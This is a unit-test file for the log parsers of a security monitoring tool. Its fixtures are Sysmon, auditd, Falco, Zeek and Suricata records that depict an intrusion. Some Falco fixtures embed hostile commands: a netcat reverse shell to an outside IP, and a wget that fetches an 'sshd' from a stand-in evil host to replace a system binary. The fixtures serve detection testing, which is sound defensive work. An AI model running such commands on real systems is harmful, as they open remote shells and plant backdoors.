"""
Unit tests for data source parsers, status tracker, and sample data loader.

Runs without SQL Server or any external dependencies.
"""
import json
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# ── Module-level imports ─────────────────────────────────────────────
from utils.winlog.parser_sysmon import parse_sysmon_event, parse_sysmon_batch
from utils.behavior_monitor.parser_auditd_falco import (
    parse_auditd_line,
    parse_auditd_lines,
    parse_falco_event,
    parse_falco_lines,
)
from utils.traffic_fenxi.parser_zeek_suricata import (
    parse_zeek_log,
    parse_zeek_file,
    parse_suricata_eve,
)
from utils.datasource_status import get_status_tracker, _register_default_sources


# ── Sysmon Test Data ─────────────────────────────────────────────────

SYSMON_PC = """
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/>
    <EventID>1</EventID>
    <TimeCreated SystemTime='2026-07-09T06:30:00.123456789Z'/>
    <Computer>win-dc01.security.local</Computer>
  </System>
  <EventData>
    <Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name='ProcessId'>5432</Data>
    <Data Name='CommandLine'>powershell.exe -NoP -enc SQBFAFgAIAAo...</Data>
    <Data Name='User'>SECURITY\\jdoe</Data>
    <Data Name='ParentImage'>C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data>
    <Data Name='ParentProcessId'>3210</Data>
    <Data Name='Hashes'>SHA256=ABCD1234</Data>
    <Data Name='IntegrityLevel'>Medium</Data>
  </EventData>
</Event>"""

SYSMON_NC = """
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/>
    <EventID>3</EventID>
    <TimeCreated SystemTime='2026-07-09T06:30:05.456789012Z'/>
    <Computer>win-dc01.security.local</Computer>
  </System>
  <EventData>
    <Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name='ProcessId'>5432</Data>
    <Data Name='Protocol'>tcp</Data>
    <Data Name='SourceIp'>192.168.10.50</Data>
    <Data Name='DestinationIp'>185.220.101.34</Data>
    <Data Name='DestinationPort'>443</Data>
    <Data Name='User'>SECURITY\\jdoe</Data>
  </EventData>
</Event>"""

SYSMON_DNS = """
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/>
    <EventID>22</EventID>
    <TimeCreated SystemTime='2026-07-09T06:30:10.789012345Z'/>
    <Computer>win-dc01.security.local</Computer>
  </System>
  <EventData>
    <Data Name='QueryName'>evil-c2.example.com</Data>
    <Data Name='QueryStatus'>0</Data>
    <Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name='ProcessId'>5432</Data>
    <Data Name='User'>SECURITY\\jdoe</Data>
  </EventData>
</Event>"""

SYSMON_FC = """
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/>
    <EventID>11</EventID>
    <TimeCreated SystemTime='2026-07-09T06:30:15.012345678Z'/>
    <Computer>win-dc01.security.local</Computer>
  </System>
  <EventData>
    <Data Name='TargetFilename'>C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe</Data>
    <Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name='ProcessId'>5432</Data>
    <Data Name='User'>SECURITY\\jdoe</Data>
  </EventData>
</Event>"""

SYSMON_REG = """
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/>
    <EventID>13</EventID>
    <TimeCreated SystemTime='2026-07-09T06:30:20.345678901Z'/>
    <Computer>win-dc01.security.local</Computer>
  </System>
  <EventData>
    <Data Name='TargetObject'>HKU\\S-1-5-21-...\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate</Data>
    <Data Name='Details'>C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe</Data>
    <Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name='ProcessId'>5432</Data>
    <Data Name='User'>SECURITY\\jdoe</Data>
  </EventData>
</Event>"""

SYSMON_INJ = """
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/>
    <EventID>8</EventID>
    <TimeCreated SystemTime='2026-07-09T06:30:25.678901234Z'/>
    <Computer>win-dc01.security.local</Computer>
  </System>
  <EventData>
    <Data Name='SourceImage'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name='SourceProcessId'>5432</Data>
    <Data Name='TargetImage'>C:\\Windows\\System32\\svchost.exe</Data>
    <Data Name='TargetProcessId'>1024</Data>
    <Data Name='User'>SECURITY\\jdoe</Data>
  </EventData>
</Event>"""

# ── Auditd Test Data ─────────────────────────────────────────────────

AD_EXECVE = 'type=SYSCALL msg=audit(1752085800.123:456): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234567000 a1=7f1234568000 a2=7f1234569000 a3=0 items=2 ppid=2345 pid=6789 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts1 ses=10 comm="curl" exe="/usr/bin/curl" key="command-exec"'

AD_OPENAT = 'type=SYSCALL msg=audit(1752085900.456:789): arch=c000003e syscall=257 success=no exit=-13 a0=ffffff9c a1=7ffd12345670 a2=80000 a3=0 items=1 ppid=3456 pid=7890 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=11 comm="cat" exe="/usr/bin/cat" key="file-access"'

AD_CONNECT = 'type=SYSCALL msg=audit(1752086000.789:1012): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=7f123456a000 a2=10 a3=0 items=0 ppid=4567 pid=8901 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts3 ses=12 comm="nc" exe="/usr/bin/nc.openbsd" key="network-connect"'

AD_UNLINK = 'type=SYSCALL msg=audit(1752086100.012:1345): arch=c000003e syscall=87 success=yes exit=0 a0=7f123456b000 a1=0 a2=0 a3=0 items=1 ppid=5678 pid=9012 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts4 ses=13 comm="rm" exe="/usr/bin/rm" key="file-delete"'

AD_USER_AUTH = 'type=USER_AUTH msg=audit(1752086200.345:1678): pid=12345 uid=0 auid=4294967295 ses=4294967295 msg=\'op=PAM:authentication grantors=pam_unix,pam_permit acct="root" exe="/usr/sbin/sshd" hostname=10.0.0.50 addr=10.0.0.50 terminal=ssh res=success\''

# ── Falco Test Data ──────────────────────────────────────────────────

FALCO_SHELL = '{"output":"06:30:00.123: Warning A shell was spawned in a container (user=root container_id=abc123 shell=bash parent=sh cmdline=bash -i)","priority":"Warning","rule":"A shell was spawned in a container","time":"2026-07-09T06:30:00.123456789Z","output_fields":{"container.id":"abc123","proc.cmdline":"bash -i","proc.name":"bash","proc.pname":"sh","proc.pid":5678,"proc.ppid":1234,"user.name":"root","user.uid":0}}'

FALCO_FILE = '{"output":"06:31:00.234: Warning Write below /etc detected (user=root file=/etc/ld.so.preload program=vi)","priority":"Warning","rule":"Write below etc","time":"2026-07-09T06:31:00.234567890Z","output_fields":{"container.id":"host","fd.name":"/etc/ld.so.preload","proc.cmdline":"vi /etc/ld.so.preload","proc.name":"vi","proc.pname":"sshd","proc.pid":6789,"user.name":"root","user.uid":0}}'

FALCO_NET = '{"output":"06:32:00.345: Warning Outbound connection to C2 server detected (command=nc connection=192.168.10.5:45678->185.220.101.34:4444)","priority":"Warning","rule":"Outbound connection to C2 server","time":"2026-07-09T06:32:00.345678901Z","output_fields":{"container.id":"host","fd.sip":"192.168.10.5","fd.sport":"45678","fd.dip":"185.220.101.34","fd.dport":"4444","fd.l4proto":"tcp","proc.cmdline":"nc 185.220.101.34 4444 -e /bin/bash","proc.name":"nc","proc.pname":"bash","proc.pid":7890,"user.name":"root","user.uid":0}}'

FALCO_CRON = '{"output":"06:33:00.456: Warning Unexpected process spawned by cron (user=root command=/tmp/.hidden/backdoor parent=cron)","priority":"Warning","rule":"Unexpected cron process","time":"2026-07-09T06:33:00.456789012Z","output_fields":{"container.id":"host","proc.cmdline":"/tmp/.hidden/backdoor","proc.name":"backdoor","proc.pname":"cron","proc.pid":8901,"proc.ppid":1,"user.name":"root","user.uid":0}}'

FALCO_BIN = '{"output":"06:34:00.567: Warning Write below binary dir (user=root command=wget file=/usr/local/bin/sshd program=wget)","priority":"Warning","rule":"Write below binary dir","time":"2026-07-09T06:34:00.567890123Z","output_fields":{"container.id":"host","fd.name":"/usr/local/bin/sshd","proc.cmdline":"wget http://evil.example.com/sshd -O /usr/local/bin/sshd","proc.name":"wget","proc.pname":"bash","proc.pid":9012,"user.name":"root","user.uid":0}}'

# ── Zeek Test Data ───────────────────────────────────────────────────

ZEEK_CONN_FIELDS = [
    "ts", "uid", "id.orig_h", "id.orig_p", "id.resp_h", "id.resp_p",
    "proto", "service", "duration", "orig_bytes", "resp_bytes",
    "conn_state", "local_orig", "local_resp", "missed_bytes",
    "history", "orig_pkts", "orig_ip_bytes", "resp_pkts", "resp_ip_bytes",
    "tunnel_parents",
]
ZEEK_CONN = "1752085800.123456\tC8abc123def45678\t192.168.10.50\t49152\t185.220.101.34\t443\ttcp\tssl\t12.345678\t12345\t567890\tSF\t-\t-\t0\tShADadFf\t45\t15000\t60\t580000\t-"

# ── Suricata Test Data ───────────────────────────────────────────────

SURICATA_ALERT = '{"timestamp":"2026-07-09T06:30:05.123456+0800","flow_id":1,"event_type":"alert","src_ip":"192.168.10.50","src_port":49162,"dest_ip":"185.220.101.34","dest_port":443,"proto":"TCP","alert":{"action":"allowed","signature_id":2012345,"signature":"ET TROJAN Cobalt Strike Beacon","category":"A Network Trojan was detected","severity":1},"flow":{"pkts_toserver":5,"pkts_toclient":3,"bytes_toserver":1024,"bytes_toclient":4096}}'

SURICATA_DNS = '{"timestamp":"2026-07-09T06:30:10.234567+0800","flow_id":2,"event_type":"dns","src_ip":"192.168.10.50","src_port":49153,"dest_ip":"10.0.0.1","dest_port":53,"proto":"UDP","dns":{"type":"query","rrname":"malware-c2.example.org","rrtype":"A","rcode":"NOERROR"}}'


# ═══════════════════════════════════════════════════════════════════════
# Helpers
# ═══════════════════════════════════════════════════════════════════════

def _check_unified_fields(test, ev, data_source):
    test.assertIsInstance(ev, dict)
    test.assertIn("timestamp", ev)
    test.assertIn("data_source", ev)
    test.assertEqual(ev["data_source"], data_source)
    test.assertIn("event_type", ev)
    test.assertIsInstance(ev.get("entities"), dict)
    test.assertIsInstance(ev.get("features"), dict)
    test.assertIn("host_ip", ev)


# ═══════════════════════════════════════════════════════════════════════
# Sysmon Parser Tests
# ═══════════════════════════════════════════════════════════════════════

class TestSysmonParser(unittest.TestCase):
    def test_process_create(self):
        ev = parse_sysmon_event(SYSMON_PC)
        self.assertIsNotNone(ev, "parse_sysmon_event returned None for valid Sysmon Event 1 XML")
        _check_unified_fields(self, ev, "sysmon")
        self.assertEqual(ev["event_type"], "process_create")
        self.assertIn("powershell.exe", ev["entities"]["process_name"])
        self.assertEqual(ev["entities"]["pid"], 5432)
        self.assertEqual(ev["entities"]["parent_pid"], 3210)
        self.assertIn("WINWORD", ev["entities"]["parent_process"])

    def test_network_connect(self):
        ev = parse_sysmon_event(SYSMON_NC)
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "network_connection")
        self.assertEqual(ev["entities"]["dst_ip"], "185.220.101.34")
        self.assertEqual(ev["entities"]["dst_port"], "443")
        self.assertEqual(ev["entities"]["protocol"], "tcp")

    def test_dns_query(self):
        ev = parse_sysmon_event(SYSMON_DNS)
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "dns_query")
        self.assertEqual(ev["entities"]["dns_query"], "evil-c2.example.com")

    def test_file_create(self):
        ev = parse_sysmon_event(SYSMON_FC)
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "file_create")
        self.assertIn("payload.exe", ev["entities"]["file_path"])

    def test_registry_set(self):
        ev = parse_sysmon_event(SYSMON_REG)
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "registry_set_value")
        self.assertIn("Run", ev["entities"]["registry_key"])

    def test_process_injection(self):
        ev = parse_sysmon_event(SYSMON_INJ)
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "process_injection")
        self.assertIn("powershell", ev["entities"]["source_process"])
        self.assertIn("svchost", ev["entities"]["target_process"])

    def test_host_ip_override(self):
        ev = parse_sysmon_event(SYSMON_PC, host_ip="10.0.0.99", host_name="custom-host")
        self.assertIsNotNone(ev)
        self.assertEqual(ev["host_ip"], "10.0.0.99")
        self.assertEqual(ev["host_name"], "custom-host")

    def test_batch_parsing(self):
        events = [
            {"_raw_xml": SYSMON_PC},
            {"_raw_xml": SYSMON_NC},
            {"_raw_xml": SYSMON_DNS},
        ]
        results = parse_sysmon_batch(events, host_ip="10.0.0.1")
        self.assertEqual(len(results), 3)

    def test_invalid_xml_returns_none(self):
        self.assertIsNone(parse_sysmon_event("<not><valid>xml"))

    def test_empty_input(self):
        self.assertIsNone(parse_sysmon_event(""))
        self.assertIsNone(parse_sysmon_event(None))


# ═══════════════════════════════════════════════════════════════════════
# Auditd Parser Tests
# ═══════════════════════════════════════════════════════════════════════

class TestAuditdParser(unittest.TestCase):
    def test_execve(self):
        ev = parse_auditd_line(AD_EXECVE, host_ip="192.168.10.10", host_name="linux-srv")
        self.assertIsNotNone(ev, f"parse_auditd_line returned None. Input: {AD_EXECVE[:80]}...")
        _check_unified_fields(self, ev, "auditd")
        self.assertEqual(ev["event_type"], "process_create")
        self.assertEqual(ev["entities"]["process_name"], "curl")
        self.assertEqual(ev["entities"]["pid"], 6789)
        self.assertEqual(ev["entities"]["parent_pid"], 2345)

    def test_openat(self):
        ev = parse_auditd_line(AD_OPENAT)
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "file_access")
        self.assertEqual(ev["entities"]["process_name"], "cat")

    def test_connect(self):
        ev = parse_auditd_line(AD_CONNECT)
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "network_connection")
        self.assertEqual(ev["entities"]["process_name"], "nc")

    def test_unlink(self):
        ev = parse_auditd_line(AD_UNLINK)
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "file_delete")

    def test_user_auth(self):
        ev = parse_auditd_line(AD_USER_AUTH)
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "user_auth")

    def test_batch_parsing(self):
        lines = [AD_EXECVE, AD_OPENAT, AD_CONNECT, AD_UNLINK, AD_USER_AUTH]
        results = parse_auditd_lines(lines)
        self.assertGreaterEqual(len(results), 5)

    def test_unrecognized_syscall_returns_none(self):
        ev = parse_auditd_line('type=SYSCALL msg=audit(100.0:1): arch=c000003e syscall=999 success=yes exit=0 comm="test" exe="/bin/test"')
        self.assertIsNone(ev)

    def test_malformed_line(self):
        self.assertIsNone(parse_auditd_line(""))
        self.assertIsNone(parse_auditd_line(None))
        self.assertIsNone(parse_auditd_line("not an audit line"))


# ═══════════════════════════════════════════════════════════════════════
# Falco Parser Tests
# ═══════════════════════════════════════════════════════════════════════

class TestFalcoParser(unittest.TestCase):
    def test_shell_spawn(self):
        ev = parse_falco_event(FALCO_SHELL, host_ip="192.168.10.20")
        self.assertIsNotNone(ev)
        _check_unified_fields(self, ev, "falco")
        self.assertEqual(ev["event_type"], "process_create")
        self.assertEqual(ev["entities"]["process_name"], "bash")

    def test_file_write(self):
        ev = parse_falco_event(FALCO_FILE)
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "file_access")
        self.assertIn("/etc/ld.so.preload", ev["entities"].get("file_path", ""))

    def test_network_connection(self):
        ev = parse_falco_event(FALCO_NET)
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "network_connection")
        self.assertEqual(ev["entities"]["src_ip"], "192.168.10.5")
        self.assertEqual(ev["entities"]["dst_ip"], "185.220.101.34")
        self.assertEqual(ev["entities"]["dst_port"], "4444")

    def test_cron_process(self):
        ev = parse_falco_event(FALCO_CRON)
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "process_create")
        self.assertEqual(ev["entities"]["process_name"], "backdoor")

    def test_binary_write(self):
        ev = parse_falco_event(FALCO_BIN)
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "file_access")
        self.assertIn("/usr/local/bin/sshd", ev["entities"].get("file_path", ""))

    def test_invalid_json(self):
        self.assertIsNone(parse_falco_event("not json"))
        self.assertIsNone(parse_falco_event(""))
        self.assertIsNone(parse_falco_event(None))

    def test_batch_parsing(self):
        results = parse_falco_lines([FALCO_SHELL, FALCO_FILE, FALCO_NET, FALCO_CRON, FALCO_BIN])
        self.assertGreaterEqual(len(results), 5)


# ═══════════════════════════════════════════════════════════════════════
# Zeek Parser Tests
# ═══════════════════════════════════════════════════════════════════════

class TestZeekParser(unittest.TestCase):
    def test_conn_log(self):
        ev = parse_zeek_log(ZEEK_CONN, log_type="conn", fields=ZEEK_CONN_FIELDS, host_name="zeek-sensor")
        self.assertIsNotNone(ev)
        _check_unified_fields(self, ev, "zeek")
        self.assertEqual(ev["event_type"], "tcp_connection")
        self.assertEqual(ev["src_ip"], "192.168.10.50")
        self.assertEqual(ev["dst_ip"], "185.220.101.34")
        self.assertEqual(ev["dst_port"], "443")
        self.assertEqual(ev["protocol"], "tcp")

    def test_fallback_to_conn_type(self):
        ev = parse_zeek_log(ZEEK_CONN, log_type=None, host_name="zeek-sensor")
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "tcp_connection")

    def test_invalid_line(self):
        self.assertIsNone(parse_zeek_log(""))
        self.assertIsNone(parse_zeek_log(None))

    def test_nonexistent_file(self):
        results = parse_zeek_file("nonexistent_file.log")
        self.assertEqual(len(results), 0)


# ═══════════════════════════════════════════════════════════════════════
# Suricata Parser Tests
# ═══════════════════════════════════════════════════════════════════════

class TestSuricataParser(unittest.TestCase):
    def test_alert(self):
        ev = parse_suricata_eve(SURICATA_ALERT, host_name="suricata-sensor")
        self.assertIsNotNone(ev)
        _check_unified_fields(self, ev, "suricata")
        self.assertEqual(ev["event_type"], "network_alert")
        self.assertIn("Cobalt Strike", ev["entities"]["alert_signature"])
        self.assertEqual(ev["entities"]["alert_severity"], 1)
        self.assertTrue(ev["features"].get("is_suspicious"))

    def test_dns(self):
        ev = parse_suricata_eve(SURICATA_DNS, host_name="suricata")
        self.assertIsNotNone(ev)
        self.assertEqual(ev["event_type"], "dns_query")
        self.assertIn("malware-c2", ev["entities"]["dns_query"])

    def test_invalid_json(self):
        self.assertIsNone(parse_suricata_eve("not valid json"))

    def test_empty(self):
        self.assertIsNone(parse_suricata_eve(""))
        self.assertIsNone(parse_suricata_eve(None))


# ═══════════════════════════════════════════════════════════════════════
# DataSourceStatusTracker Tests
# ═══════════════════════════════════════════════════════════════════════

class TestDataSourceStatus(unittest.TestCase):
    def setUp(self):
        self.tracker = get_status_tracker()
        self.tracker.clear()
        _register_default_sources()

    def tearDown(self):
        self.tracker.clear()

    def test_singleton(self):
        t2 = get_status_tracker()
        self.assertIs(self.tracker, t2)

    def test_register_sources(self):
        status = self.tracker.get_all_status_list()
        self.assertGreater(len(status), 0)
        names = [s["source_name"] for s in status]
        self.assertIn("sysmon", names)
        self.assertIn("zeek", names)

    def test_initial_status_is_unknown(self):
        self.tracker.reset_source("test-source")
        self.tracker.register_source("test-source")
        src = self.tracker.get_status("test-source")
        self.assertEqual(src["status"], "unknown")

    def test_record_ingestion_updates_status(self):
        self.tracker.reset_source("test-source")
        self.tracker.register_source("test-source")
        self.tracker.record_ingestion("test-source", inserted=10, skipped=2, errors=0)
        src = self.tracker.get_status("test-source")
        self.assertEqual(src["status"], "healthy")
        self.assertEqual(src["total_inserted"], 10)
        self.assertIsNotNone(src["last_ingestion_time"])

    def test_record_error(self):
        self.tracker.reset_source("test-source")
        self.tracker.register_source("test-source")
        self.tracker.record_error("test-source", "something went wrong")
        src = self.tracker.get_status("test-source")
        self.assertEqual(src["last_error"], "something went wrong")
        self.assertEqual(src["total_errors"], 1)
        self.assertEqual(src["consecutive_errors"], 1)

    def test_three_errors_flip_to_error(self):
        self.tracker.reset_source("test-source")
        self.tracker.register_source("test-source")
        # Must have at least one successful ingestion first (sets last_ingestion_time)
        self.tracker.record_ingestion("test-source", inserted=1, skipped=0, errors=0)
        # Then 3 consecutive errors
        self.tracker.record_error("test-source", "fail1")
        self.tracker.record_error("test-source", "fail2")
        self.tracker.record_error("test-source", "fail3")
        src = self.tracker.get_status("test-source")
        self.assertEqual(src["status"], "error")

    def test_success_after_error_resets(self):
        self.tracker.reset_source("test-source")
        self.tracker.register_source("test-source")
        self.tracker.record_error("test-source", "fail")
        self.tracker.record_error("test-source", "fail")
        self.tracker.record_ingestion("test-source", inserted=5, skipped=1, errors=0)
        src = self.tracker.get_status("test-source")
        self.assertEqual(src["consecutive_errors"], 0)

    def test_get_summary(self):
        summary = self.tracker.get_summary()
        self.assertIn("total_sources", summary)
        self.assertIn("healthy", summary)


# ═══════════════════════════════════════════════════════════════════════
# Sample Data Loader Tests
# ═══════════════════════════════════════════════════════════════════════

class TestSampleDataLoader(unittest.TestCase):
    def setUp(self):
        from utils.data_bridge import get_bridge
        get_bridge().clear_all()

    def tearDown(self):
        from utils.data_bridge import get_bridge
        get_bridge().clear_all()

    def test_load_sysmon_samples(self):
        from utils.sample_data_loader import load_sysmon_samples
        result = load_sysmon_samples(host_name="test-sysmon")
        self.assertGreaterEqual(result.get("inserted", 0), 5,
            f"Sysmon sample load should insert >=5 events, got: {result}")

    def test_load_auditd_samples(self):
        from utils.sample_data_loader import load_auditd_samples
        result = load_auditd_samples(host_name="test-auditd")
        self.assertGreaterEqual(result.get("inserted", 0), 5,
            f"Auditd sample load should insert >=5 events, got: {result}")

    def test_load_falco_samples(self):
        from utils.sample_data_loader import load_falco_samples
        result = load_falco_samples(host_name="test-falco")
        self.assertGreaterEqual(result.get("inserted", 0), 5,
            f"Falco sample load should insert >=5 events, got: {result}")

    def test_load_zeek_samples(self):
        from utils.sample_data_loader import load_zeek_samples
        result = load_zeek_samples(host_name="test-zeek")
        self.assertGreaterEqual(result.get("inserted", 0), 5,
            f"Zeek sample load should insert >=5 events, got: {result}")

    def test_load_suricata_samples(self):
        from utils.sample_data_loader import load_suricata_samples
        result = load_suricata_samples(host_name="test-suricata")
        self.assertGreaterEqual(result.get("inserted", 0), 5,
            f"Suricata sample load should insert >=5 events, got: {result}")

    def test_load_all_samples(self):
        from utils.sample_data_loader import load_all_samples
        results = load_all_samples()
        for src_name in ["sysmon", "auditd", "falco", "zeek", "suricata"]:
            self.assertIn(src_name, results, f"Missing source: {src_name}")
            self.assertGreaterEqual(
                results[src_name].get("inserted", 0), 5,
                f"{src_name}: expected >=5 inserted, got {results[src_name]}"
            )

    def test_data_in_databridge(self):
        from utils.sample_data_loader import load_all_samples
        from utils.data_bridge import get_bridge
        load_all_samples()
        bridge = get_bridge()

        behaviors = bridge.query("HostBehaviors", limit=200)
        self.assertGreaterEqual(len(behaviors), 15,
            f"Expected >=15 behaviors (sysmon+auditd+falco), got {len(behaviors)}")

        traffic = bridge.query("NetworkTraffic", limit=200)
        self.assertGreaterEqual(len(traffic), 10,
            f"Expected >=10 traffic events (zeek+suricata), got {len(traffic)}")

    def test_get_all_events_includes_all(self):
        from utils.sample_data_loader import load_all_samples
        from utils.data_bridge import get_bridge
        load_all_samples()
        events = get_bridge().get_all_events()
        self.assertGreaterEqual(len(events), 20,
            f"Expected >=20 unified events, got {len(events)}")

    def test_no_duplicate_events(self):
        """Events should not be duplicated in get_all_events."""
        from utils.sample_data_loader import load_all_samples
        from utils.data_bridge import get_bridge
        load_all_samples()
        bridge = get_bridge()
        events = bridge.get_all_events()
        hashes = [e.get("event_hash") for e in events if e.get("event_hash")]
        self.assertEqual(len(hashes), len(set(hashes)),
            f"Found {len(hashes) - len(set(hashes))} duplicate event hashes in get_all_events()")

    def test_network_traffic_classification(self):
        """Zeek and Suricata events should be classified as network_traffic."""
        from utils.sample_data_loader import load_all_samples
        from utils.data_bridge import get_bridge
        load_all_samples()
        bridge = get_bridge()
        events = bridge.get_all_events()

        # Count by _category
        net_count = sum(1 for e in events if e.get("_category") == "network_traffic")
        self.assertGreater(net_count, 0,
            f"Expected >0 network_traffic events, got {net_count}. Events: {[(e.get('data_source'), e.get('_category')) for e in events[:5]]}")


# ═══════════════════════════════════════════════════════════════════════
# Host IP Semantic Tests
# ═══════════════════════════════════════════════════════════════════════

class TestHostIpSemantics(unittest.TestCase):
    """Ensure host_ip only contains valid IPs, never hostnames."""

    def test_sysmon_host_ip_is_not_computer_name(self):
        ev = parse_sysmon_event(SYSMON_PC)
        self.assertIsNotNone(ev)
        # host_ip must be empty or a valid IP, never a hostname like "win-dc01.security.local"
        hip = ev.get("host_ip", "")
        self.assertFalse(
            ".security.local" in str(hip) or "win-dc01" in str(hip),
            f"host_ip should not contain hostname, got: {hip}"
        )
        # host_name may contain the computer name
        self.assertIn("win-dc01", ev.get("host_name", ""))

    def test_zeek_host_ip_is_not_sensor_name(self):
        ev = parse_zeek_log(ZEEK_CONN, log_type="conn", fields=ZEEK_CONN_FIELDS, host_name="zeek-sensor-prod")
        self.assertIsNotNone(ev)
        hip = ev.get("host_ip", "")
        self.assertEqual(hip, "",
            f"host_ip should be empty (not the sensor name), got: {hip}")
        self.assertEqual(ev.get("host_name"), "zeek-sensor-prod")

    def test_suricata_host_ip_is_not_sensor_name(self):
        ev = parse_suricata_eve(SURICATA_ALERT, host_name="suricata-gw-01")
        self.assertIsNotNone(ev)
        hip = ev.get("host_ip", "")
        self.assertEqual(hip, "",
            f"host_ip should be empty (not the sensor name), got: {hip}")
        self.assertEqual(ev.get("host_name"), "suricata-gw-01")

    def test_sysmon_host_ip_override(self):
        """host_ip override should accept valid IPs."""
        ev = parse_sysmon_event(SYSMON_PC, host_ip="192.168.1.100", host_name="custom-host")
        self.assertIsNotNone(ev)
        self.assertEqual(ev["host_ip"], "192.168.1.100")
        self.assertEqual(ev["host_name"], "custom-host")


# ═══════════════════════════════════════════════════════════════════════
# Status Error Tracking Tests
# ═══════════════════════════════════════════════════════════════════════

class TestStatusErrorTracking(unittest.TestCase):
    """Verify error state is preserved on failure and cleared on success."""

    def setUp(self):
        self.tracker = get_status_tracker()
        self.tracker.clear()
        _register_default_sources()

    def tearDown(self):
        self.tracker.clear()

    def test_error_preserves_last_error_info(self):
        """After record_error + record_ingestion, last_error should be preserved."""
        self.tracker.reset_source("test-err")
        self.tracker.register_source("test-err")
        # Simulate a failed batch: record_error first, then record_ingestion with errors=0
        self.tracker.record_error("test-err", "connection timeout")
        self.tracker.record_ingestion("test-err", inserted=0, skipped=0, errors=0)
        src = self.tracker.get_status("test-err")
        self.assertEqual(src["last_error"], "connection timeout")
        self.assertIsNotNone(src["last_error_time"])
        self.assertEqual(src["total_errors"], 1)

    def test_successful_batch_clears_error(self):
        """A fully successful batch should clear previous error state."""
        self.tracker.reset_source("test-clr")
        self.tracker.register_source("test-clr")
        # First: error
        self.tracker.record_error("test-clr", "network failure")
        self.tracker.record_ingestion("test-clr", inserted=0, skipped=0, errors=0)
        self.assertEqual(self.tracker.get_status("test-clr")["last_error"], "network failure")
        # Then: success
        self.tracker.record_ingestion("test-clr", inserted=10, skipped=2, errors=0)
        src = self.tracker.get_status("test-clr")
        self.assertIsNone(src["last_error"])
        self.assertIsNone(src["last_error_time"])
        self.assertEqual(src["consecutive_errors"], 0)
        self.assertEqual(src["status"], "healthy")

    def test_record_ingestion_without_prior_record_error(self):
        """record_ingestion with errors>0 when no prior record_error was called."""
        self.tracker.reset_source("test-direct")
        self.tracker.register_source("test-direct")
        self.tracker.record_ingestion("test-direct", inserted=0, skipped=0, errors=3)
        src = self.tracker.get_status("test-direct")
        self.assertEqual(src["total_errors"], 3)
        self.assertEqual(src["consecutive_errors"], 1)

    def test_no_double_count_when_both_called(self):
        """record_error + record_ingestion(errors=0) should only count error once."""
        self.tracker.reset_source("test-double")
        self.tracker.register_source("test-double")
        self.tracker.record_error("test-double", "disk full")
        self.tracker.record_ingestion("test-double", inserted=0, skipped=0, errors=0)
        src = self.tracker.get_status("test-double")
        self.assertEqual(src["total_errors"], 1, "errors should only be counted once")
        self.assertEqual(src["consecutive_errors"], 1)

    def test_failure_then_query_status_shows_error(self):
        """After failure, status API must show the error."""
        self.tracker.reset_source("test-query")
        self.tracker.register_source("test-query")
        self.tracker.record_ingestion("test-query", inserted=5, skipped=0, errors=0)
        self.tracker.record_error("test-query", "disk I/O error")
        self.tracker.record_ingestion("test-query", inserted=0, skipped=0, errors=0)
        src = self.tracker.get_status("test-query")
        self.assertEqual(src["last_error"], "disk I/O error")
        self.assertIsNotNone(src["last_error_time"])

    def test_success_after_failure_restores_health(self):
